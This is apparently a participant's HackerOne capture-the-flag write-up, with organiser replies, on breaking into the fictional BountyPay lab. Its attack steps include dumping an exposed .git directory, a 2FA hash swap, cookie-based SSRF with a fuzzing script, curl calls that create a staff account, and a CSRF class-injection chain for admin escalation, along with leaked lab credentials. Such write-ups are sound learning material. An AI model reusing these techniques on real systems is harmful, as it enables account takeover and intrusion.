profile.name: h1-ctf
profile.about: todayisnew reached 100K rep. Let's celebrate with a CTF!

activities.message:
After more than 20 hours I were able to complete the CTF and get the final flag.  
On this writeup I will try to explain which paths I took and what I've learned walking through them. I draw an image with the paths I took in order to solve the challenge.

![Paths](./graph.png)

Thank you very much for this CTF, since I'm studying reverse engineering android latelly the android part of this challenge were really helpful.  

# Reconnaissance
The first tweet about the CTF

![Paths](./h1ctfannounce.png)

And an interesting retweet.

![Paths](./bountypayt1.png)

Lead me to the BountyPay HQ twitter, the most recent tweet was about a new employee called Sandra, then I head to "followed by" page and Sandra Alisson was there. Clicking on Sandra's profile we could see that she took a picture of her badge with a barcode.

![Paths](./bountypayt2.png)

Seeing this great art, the announcement tweet and Sandra's badge, I went right to @h1-ctf program page to try this challenge.  

After reading the rules and description I saw that the scope were a wildcard subdomain `*.bountypay.h1ctf.com`, so let's begin the recon!  
Running [amass](https://github.com/OWASP/Amass) resulted in some interesting subdomains.  
```bash
[key@chain h1-ctf]Î» amass enum --passive -d bountypay.h1ctf.com
bountypay.h1ctf.com
# Querying messages
api.bountypay.h1ctf.com
staff.bountypay.h1ctf.com
253awww.bountypay.h1ctf.com
software.bountypay.h1ctf.com
owasp_needs_upgrade_failed_to_send_a_nonce.bountypay.h1ctf.com
www.bountypay.h1ctf.com
2b-www.bountypay.h1ctf.com
app.bountypay.h1ctf.com
20-www.bountypay.h1ctf.com
3awww.bountypay.h1ctf.com

OWASP Amass v3.5.4                                https://github.com/OWASP/Amass
--------------------------------------------------------------------------------
11 names discovered - cert: 2, api: 1, dns: 1, scrape: 7
```
Now that we have those 4 subdomains let's see how they look like on browser, but after this let's run some small fuzzing with [ffuf](https://github.com/ffuf/ffuf/) to see if we find a hidden page or directory.

app.bountypay.h1ctf.com

![Software subdomain](./appsub.png)

On this one we can see only a login page, I thought about login bypass and tried some combinations of Sandra with her leaked badge, nothing worked.

staff.bountypay.h1ctf.com

![Software subdomain](./staffsub.png)

This page seems interesting, we have a login page and a `template` parameter, so I tried some well known names in this parameter, like `admin`, `user`, `staff`, and I could find that `admin` exists and returned `No Access to this resource`. With this in mind I tried some parameter polution to see if I could load admin page but with the backend thinking that I'm loading the login page. Then I discovered that I could load two templates with one request by the payload `?template[]=admin&template[]=login`.

api.bountypay.h1ctf.com

![Software subdomain](./apisub.png)

This has just a link to `/redirect?url=https://www.google.com/search?q=REST+API`, so I tried running some open redirects payloads but everything was leading me to `URL NOT FOUND IN WHITELIST`, then I realized that I was wasting time with this and went to another subdomain.

software.bountypay.h1ctf.com

![Software subdomain](./softwaresub.png)

We can't access this page at all, then I went back to api and tried a redirect to software subdomain but got 401 again.

With nothing working I was starting to feel sad and even tried some stego tools on Sandra's picture, then I remembered that I was running ffuf and looked into the terminal, ffuf said to me that `.git` was `403 forbidden` on `app.bountypay.h1ctf.com` and then I realized this could be the first step.

# First log in

Running [git-dumper](https://github.com/arthaud/git-dumper) I was able to get some interesting files from the server, reading the config file from .git directory, it leaked a [github repository](https://github.com/bounty-pay-code/request-logger.git) with only one file `logger.php`.

```php
$data = array(
  'IP'        =>  $_SERVER["REMOTE_ADDR"],
  'URI'       =>  $_SERVER["REQUEST_URI"],
  'METHOD'    =>  $_SERVER["REQUEST_METHOD"],
  'PARAMS'    =>  array(
      'GET'   =>  $_GET,
      'POST'  =>  $_POST
  )
);

file_put_contents('bp_web_trace.log', date("U").':'.base64_encode(json_encode($data))."\n",FILE_APPEND);
```

Nice!! We have a file that is probably in the server, let's try to download it. Downloading `bp_web_trace.log` and decoding it we could leak a username and password from it.
```
1588931909:{"IP":"192.168.1.1","URI":"\/","METHOD":"GET","PARAMS":{"GET":[],"POST":[]}}
1588931919:{"IP":"192.168.1.1","URI":"\/","METHOD":"POST","PARAMS":{"GET":[],"POST":{"username":"brian.oliver","password":"V7h0inzX"}}}
1588931928:{"IP":"192.168.1.1","URI":"\/","METHOD":"POST","PARAMS":{"GET":[],"POST":{"username":"brian.oliver","password":"V7h0inzX","challenge_answer":"bD83Jk27dQ"}}}
1588931945:{"IP":"192.168.1.1","URI":"\/statements","METHOD":"GET","PARAMS":{"GET":{"month":"04","year":"2020"},"POST":[]}}
```
Trying the credentials from this log file we could log in, but now we have to bypass the 2FA.

![First 2FA](./login1.png)

Seeing the 2FA source code page we could see an interesting HTML
```html
<input type="hidden" name="username" value="brian.oliver">
<input type="hidden" name="password" value="V7h0inzX">
<input type="hidden" name="challenge" value="1dfd2b21c3c7d3cc08ce69d2eaa4b63d">
```
So my first try was to change this hash to `md5(bD83Jk27dQ)=5828c689761cce705a1c84d9b1a1ed5e` and send `bD83Jk27dQ` as the password, and the bypass were complete. Logged in I was able to load transactions from a month, then I tried to load `04/2020` because of the log file.

![After login](./login2.png)

# SSRF inside cookie This request I made were calling me for a api fuzz, with the fuzzingg on background I looked for the session cookies. The only cookie I've found was `token` with a base64 string associated, this cookie were not HttpOnly and not secure, then I decoded it and it were a json string. ```bash [key@chain h1-ctf]Î» echo -n eyJhY2NvdW50X2lkIjoiRjhnSGlxU2RwSyIsImhhc2giOiJkZTIzNWJmZmQyM2RmNjk5NWFkNGUwOTMwYmFhYzFhMiJ9 | base64 -d {"account_id":"F8gHiqSdpK","hash":"de235bffd23df6995ad4e0930baac1a2"} ``` This looks pretty straightforward, we must do an IDOR with Sandra's badge and type juggling the hash! So with the payload in hands and the transactions request I saw that I was completely wrong, but also the type juggling was true. I also tried IDORing the pay endpoint, that I've found on `app.js` file, but could not find anything. ![Not an idor](./noidor.png) By this request I was able to see that I could craft a url changing the `account_id` parameter on cookie. Firstly we will ignore the last part `/statements?month=04&year=2020` with a #, this will change this part into a fragment and it worked as expected. ![Still not an idor](./noidor2.png) Ok, let's try to see some paths on api, like api/staff (found by background fuzzing). None of the paths worked. Some hours later I thought, "Now we can just test if `/redirect` will work as SSRF, if it follows redirect then we can see `software.bountypay.h1ctf.com`", executing this thought with the payload `../../../../redirect?url=https://software.bountypay.h1ctf.com/#` I were able to see the login page on the response `data` attribute. ![Software login page](./softwarelogin.png) Since it were night and I were tired, I wrote a quick script to fuzz this subdomain and put it to run with a dictionary and went to sleep. ```python import requests import base64 import json session = requests.Session() APP_ENDPOINT_NOSCHEMA = "app.bountypay.h1ctf.com" APP_ENDPOINT = f"https://{APP_ENDPOINT_NOSCHEMA}" SOFTWARE_ENDPOINT = "https://software.bountypay.h1ctf.com" with open("storage.dict") as f: path = f.readline()[:-1] token_base = {} while path: token_base["account_id"] = f"../../../../../../redirect?url={SOFTWARE_ENDPOINT}/{path}#" token_base["hash"] = 0 token = base64.b64encode(json.dumps(token_base).encode()).decode() session.cookies.set("token", token, path='/', domain=APP_ENDPOINT_NOSCHEMA) r = session.get(f"{APP_ENDPOINT}/statements?month=02&year=2020") if "Not Found" not in r.json()['data']: print(f"Found! {path}\n\n{r.json()['data']}") path = f.readline()[:-1] ``` Waking up the next morning I got a really cool finding. ```html Found! uploads Index of /uploads/

Index of /uploads/

../
BountyPay.apk                                        20-Apr-2020 11:26              4043701
``` Then I tried to fetch it with my browser and downloaded the file.

# Finally Sandra Now that we have a master hash and the header value we can go to the api endpoints mapped. ```bash [key@chain h1-ctf]Î» curl https://api.bountypay.h1ctf.com/api/accounts/F8gHiqSdpK/ -H "X-Token: 8e9998ee3137ca9ade8f372739f062c1" {"account_id":"F8gHiqSdpK","owner":"Mr Brian Oliver","company":"BountyPay Demo "} [key@chain h1-ctf]Î» curl https://api.bountypay.h1ctf.com/api/staff -H "X-Token: 8e9998ee3137ca9ade8f372739f062c1" [{"name":"Sam Jenkins","staff_id":"STF:84DJKEIP38"},{"name":"Brian Oliver","staff_id":"STF:KE624RQ2T9"}] [key@chain h1-ctf]Î» curl https://api.bountypay.h1ctf.com/api/staff/84DJKEIP38 -H "X-Token: 8e9998ee3137ca9ade8f372739f062c1" ["Endpoint Not Found"] [key@chain h1-ctf]Î» curl -X POST https://api.bountypay.h1ctf.com/api/staff/84DJKEIP38 -H "X-Token: 8e9998ee3137ca9ade8f372739f062c1" ["Endpoint Not Found"] [key@chain h1-ctf]Î» curl -X POST https://api.bountypay.h1ctf.com/api/staff/ -H "X-Token: 8e9998ee3137ca9ade8f372739f062c1" ["Missing Parameter"] [key@chain h1-ctf]Î» curl https://api.bountypay.h1ctf.com/api/staff/ -H "X-Token: 8e9998ee3137ca9ade8f372739f062c1" -d "staff_id=STF:84DJKEIP38" ["Staff Member already has an account"] ``` After these many tries I thought about my friend Sandra! ```bash [key@chain h1-ctf]Î» curl -X POST https://api.bountypay.h1ctf.com/api/staff -H "X-Token: 8e9998ee3137ca9ade8f372739f062c1" -d "staff_id=STF:8FJ3KFISL3" {"description":"Staff Member Account Created","username":"sandra.allison","password":"s%3D8qB8zEpMnc*xsz7Yp5"} ``` Now we can login inside `staff.bountypay.h1ctf.com`! # CSRF + privilege escalation I really don't know why but I thought this `%3D` on the password were `=`, but after this failure I was able to log in as Sandra. Inside the staff painel we can see 3 tabs, one is just a welcome message, one is for tickets and other is to change avatar and name. Lookingg for the source code of the page, we can see it loads a `website.js` and has the url you are accessing in base64. ![Staff page](./staff1.png) ```javascript $(".upgradeToAdmin").click(function() { let t = $('input[name="username"]').val(); $.get("/admin/upgrade?username=" + t, function() { alert("User Upgraded to Admin") }) }), $(".tab").click(function() { return $(".tab").removeClass("active"), $(this).addClass("active"), $("div.content").addClass("hidden"), $("div.content-" + $(this).attr("data-target")).removeClass("hidden"), !1 }), $(".sendReport").click(function() { $.get("/admin/report?url=" + url, function() { alert("Report sent to admin team") }), $("#myModal").modal("hide") }), document.location.hash.length > 0 && ("#tab1" === document.location.hash && $(".tab1").trigger("click"), "#tab2" === document.location.hash && $(".tab2").trigger("click"), "#tab3" === document.location.hash && $(".tab3").trigger("click"), "#tab4" === document.location.hash && $(".tab4").trigger("click")); ``` Watching for `website.js` we notice that if we call the fragment `#tabx` will trigger click of any element with the class `tabx`, we notice the presence of /admin/report, that uses the base64 url defined before the file and an event listener that triggers when an element with class `upgradeToAdmin` is clicked, also we need an username input field on page to pass as parameter to `/admin/upgrade?username=[input of username]`. With this in mind I were able to get the best idea ever, just send to admin the base64 of `/admin/upgrade?username=sandra.alisson`, with this sent I waited like 10 minutes and nothing happened. Then I just clicked the report link on footer and said that /admin was disabled. So, we have an input at avatar tab, we could maybe change it to a xss payload would work, or maybe change avatar. Then I intercepted the request and changed both to `` and went ahead to the ticket tab, but this happened. ![Staff page2](./staff2.png) Yes! Nothing cool happened, but I've noticed that `scriptalertscript` was a class name, then I killed it, it was so obvious that we needed to change it to `upgradeToAdmin` and use the report page with the parameter polution that we discovered at Recon stage. But we are missing something, we are missing the click trigger! So how can we trigger the click of avatar? On this piece of code we see that there is no tab4 element, then we can set the avatar to `upgradeToAdmin tab4` and it will trigger the click function if we pass `#tab4` as fragment of url. ```html
  • Home
  • Support Tickets
  • Profile
  • Logout
``` So let's intercept the avatar change again and put the right class on it, after we set the url to `/?template[]=login&template[]=ticket&ticket_id=3582&username=sandra.allison#tab4`, that will trigger the tab4 click, then upgradeToAdmin click, then it will look for the value of an input with name username, that will be `sandra.allison`, all this will happen because admin will read the ticket. Encoding this to base64 and sending to /admin/report should work fine. The final url will be `https://staff.bountypay.h1ctf.com/admin/report?url=Lz90ZW1wbGF0ZVtdPWxvZ2luJnRlbXBsYXRlW109dGlja2V0JnRpY2tldF9pZD0zNTgyJnVzZXJuYW1lPXNhbmRyYS5hbGxpc29uI3RhYjQ==`. Going to this url and reloading the page will escate us to admin. ![Marten is owned](./staff3.png) Now we have Marten's password!

I can't upload the images, most of them upload without a reference id, what should I do?
I uploaded it to github and will make it public when the CTF finishes, here is the link: https://github.com/chinchila/h12006/

# Partial exploit
I were able to make an F863649, since I started too late I could not complete it, it is only missing the css exfiltration.
I was able to upload the images now, that is sad, should I make a new report?

Hello,

I wanted to personally thank you for participating in the #h12006 2020 CTF, I hope you enjoyed the challenge! We received tons of great submission and it definitely made our decision a lot harder than we excepted. Unfortunately, since we only have a limited number of invites available, your write up was not selected for this event. We appreciate your hard work and we hope to see you participate in our next CTF!

We will send you a request to publicly disclose your submissions next week, so please hold on to your writeups, we'll make sure to let you know when you can publish them on your site!

If you were one of the first 10 people to submit a write-up,  look out for some private invite in the next few days!
Thank you again for participating in the #h12006 CTF!
Thanks for making a really cool challenge for the community!

summaries.content:
You can find the writeup with all images here https://github.com/chinchila/h12006
Sorry for the inconvenience.
